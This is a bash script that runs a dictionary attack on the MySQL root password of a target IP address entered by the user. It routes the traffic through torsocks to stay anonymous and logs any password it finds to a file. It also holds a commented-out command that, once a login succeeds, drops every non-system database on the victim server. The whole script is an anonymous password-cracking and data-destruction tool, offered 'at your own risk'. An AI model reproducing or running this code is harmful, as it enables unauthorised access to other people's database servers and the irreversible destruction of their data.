#/bin/bash

# USE AT YOUR OWN RISK, no responsebility will be taken by the auther.
# The auther is not responeble for what user will or won't do with this scrip.

clear
clear
echo "please enter the dictionary file name (example: rockyou.txt)"
read fileName
total=$(cat $fileName | wc -l )
echo "please enter the address to the target (example: 91.215.216.9)"
read address
item=0
correct=Database

(cat $fileName | while read pw; do
	item=`expr $item + 1`
	# Calculate the percentage of tryed passwords.
	percent=$((100*$item/$total))
	echo "$percent percent done"
	## Need to find a why to check if access was granted. ##
	( querry=$(torsocks mysql -h $address -u root -p"$pw" -e "show databases" |  head -n 1 &)
	clear
	if [ "$querry" == "$correct" ]; then
		echo $querry >> ans.txt
		echo $pw >> ans.txt
		echo "Found password"
		exit
	fi ) &
	clear

	####	The command under here tryes to connect and drops ALL databases if it is successful.	####
	#torsocks mysql -h $address -u root -p$pw  -e "show databases" | grep -v Database | grep -v mysql| grep -v information_schema| grep -v test | grep -v OLD |gawk '{print "drop database " $1 ";select sleep(0.1);"}' | mysql -u root -p$pw
done)
